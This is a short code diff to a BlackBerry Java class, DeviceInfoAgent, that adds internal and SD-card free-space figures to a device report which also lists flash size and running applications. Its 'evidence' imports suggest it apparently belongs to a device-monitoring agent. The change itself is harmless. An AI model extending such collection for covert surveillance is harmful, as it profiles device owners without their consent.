@@ -30,6 +30,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
+import blackberry.fs.Path;
 import blackberry.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -175,7 +176,12 @@ public final class DeviceInfoAgent extends Agent {
 
         // DISK
         sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
-
+        
+        sb.append("internal space: " + Path.freeSpace(Path.USER) + " Bytes\n");
+        if(Path.isSDAvailable()){
+            sb.append("SD space: " + Path.freeSpace(Path.SD) + " Bytes\n");
+        }
+        
         sb.append(getRunningApplications());
 
         try {
